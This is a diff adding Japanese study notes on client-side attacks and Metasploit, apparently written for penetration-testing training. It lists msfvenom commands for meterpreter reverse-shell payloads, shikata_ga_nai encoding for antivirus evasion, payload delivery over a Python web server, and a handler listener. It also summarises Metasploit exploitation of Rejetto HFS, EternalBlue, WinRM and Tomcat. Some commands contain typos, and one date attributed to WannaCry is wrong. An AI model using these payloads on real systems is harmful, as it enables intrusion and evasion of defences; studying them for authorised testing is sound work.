@@ -1,0 +1,91 @@
+client side attack
+msfvenom
+ペイロード
+・msfvenomは、msfによるスタンドアローンのペイロードジェネレータ
+・msfvenomの主要コマンド
+1) 利用可能なペイロードを確認
+msfvenom --list payloads
+2) ペイロード生成
+msfvenom -a xビットナンバー -p windows/xビットナンバー/meterpreter/reverrse_tcp LHOSTS=my_IP LPORT=my_PORT -f exe > 生成したいディレクトリ
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOSTS=my_IP LPORT=my_PORT -f elf > ~ディレクトリ
+3)  実行できる形式を探す
+msfvenom --list format
+4) エンコーダーグループをリスト化する
+msfvenom -list encoders
+5) エンコーダーの生成
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=my_ip LPORT=my_port xビットナンバー/shikata_ga_nai -f exe > ~ディレクトリ
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=my_ip LPORT=my_port -i 10(AV回避に役立つ) xビットナンバー/shikata_ga_nai -f exe > ~ディレクトリ
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=my_ip LPORT=my_port xビットナンバー/shikata_ga_nai -f elf > ~ディレクトリ
+6) ペイロードの配信
+sudo python -m SimpleHTTPServer port_num
+7) msfconsoleでリスナー起動
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST my_IP
+set LPORT 4444
+8) オプション
+-k:プロセスを維持
+-x:既存の実行ファイルにペイロードを埋め込む
+
+ペイロード作成の流れ
+1) OSの特定
+2) msfvenomでOSに合うペイロードを作成
+3) sudo python -m SimpleHTTPServer port_numでペイロードの配信
+4) use exploit/multi/handler
+5) runで実行
+6) meterpreterの取得
+
+自動化
+
+windows exploitation
+脆弱なHTTPファイルサーバの使用
+・HTTPファイルサーバ（HFS)は、ファイルや文書の共有を目的としてWebサーバ
+・HFSは通常TCPポート80上で動作し、基盤の通信にHTTPプロトコルを利用する。
+・Rejetto HFSは、Windows/Linux両方にセットアップできる人気のある無料かつオープンソースのHTTPファイルサーバ
+・Rejetto HFS v2.3はリモートコマンド実行(RCE)の脆弱性を抱えている
+・MSFには、HFSをホストしているターゲットにアクセスするために利用できるエクスプロイトモジュールが用意されている
+
+windows MS17-010 SMB脆弱性の悪用
+・EternalBlue(MS17-010/CVE-2017-0144)は、Windowsの一連の脆弱性とそれを悪用するエクスプロイトに付けられた名称で、
+攻撃者がリモートで任意コードを実行してWindowsシステムにアクセスし、その結果ターゲットシステムが参加するネットワーク全体に侵入できるようにする。
+・EternalBlueエクスプロイトは、NSAによって開発されたもので、MS17-010の脆弱性を突くためのツールでしたが、2017年に「Shadow Broker」と呼ばれるハッカー集団により公開された
+・EternalBlueは、Windows SMBv1プロトコルの脆弱性を突き、攻撃者が細工したパケットを送ることで、任意のコマンドの実行を可能にする
+
+・EternalBlue(MS17-010/CVE-2017-0144)は、Windowsの複数の脆弱性とそれを悪用するエクスプロイト群につけられた名称
+攻撃者はこれを使ってリモートで任意のコードを実行し、Windowsシステムへアクセス、ひいてはそのシステムが属するネットワークへ侵入できる
+・EternalBlueは、2017年6月27日のWannyCryランサムウェア攻撃で利用され、ネットワーク上の他のWindowsシステムにランサムウェアを拡散するために利用する
+
+・microsoftは、2017年3月にパッチをリリースしたが、多くの企業やユーザは、いまだにシステムパッチを利用していない
+・EternalBlueエクスプロイトには、ターゲットシステムがこの脆弱性の影響を受けるかどうかを確認できるMSF補助モジュールがあり、さらにパッチ未適用のシステムを実際に攻撃できるエクスプロイトモジュールも存在する
+・このEternalBlueエクスプロイトモジュールを使うことで、脆弱なWindowsシステムを攻撃し、権限を持つmeterpreterセッションをターゲット上で取得することが可能
+
+WinRMの悪用
+・windows remote management(winrm)は、Windowsシステムへのリモートアクセスを容易にするためのWindowsのリモート管理プロトコル
+・winrmは通常、次用途で使用する
+1) ローカルネットワーク上のWindowsホストへリモートでアクセスして対話する
+2) インターネット上のWindowsシステムへリモートでアクセスしてコマンドを実行する
+3) Windowsシステムをリモートで管理、設定する
+・winrmは通常、port5985と5986(デフォ）を使用する
+
+・winrmは、さまざまな認証方式を通じてシステム間の通信に対するアクセス制御とセキュリティを実装している
+・MSFを利用することで、Winrmのユーザ名とパスコードを特定したり、ターゲットシステム上でコマンドを実行することができる
+・また、msfのwinrmエクスプロイトモジュールを使用して、ターゲットシステム上でmeterpreterセッションを取得することを可能にする
+                        
+
+脆弱なApache Tomcat Webサーバーの悪用
+・Apache Tomcatは、人気のある無料のオープンソースなJavaサーブレット型のwebサーバ
+・Javaプラットフォーム上で動作する動的なWebサイトやwebアプリケーションの構築、ホスティングに使われる
+・Apache TomcatはHTTPプロトコルを用いてサーバとクライアント間の通信を行う
+・デフォルトで、TCPポートは8080で動作する
+
+・標準のApache HTTP webサーバは、静的および動的なWebサイトやwebアプリケーション（主にPHPで開発されたもの）をホストするために使用する
+・一方、Apache Tomcat Webサーバは、Javaで開発された動的なウェブサイトやwebアプリケーションをホストするために主に使用される
+・Apache Tomcat v8.5.19には、リモートコード実行脆弱性が存在し、攻撃者がJSPペイロードをアップロード、実行してターゲットサーバにリモートアクセスを取得できる可能性がある
+・この脆弱性を悪用してアクセスを得るために、事前構築済みのMSFエクスプロイトモジュールを使用することができる
+      
+
+
+
+
+
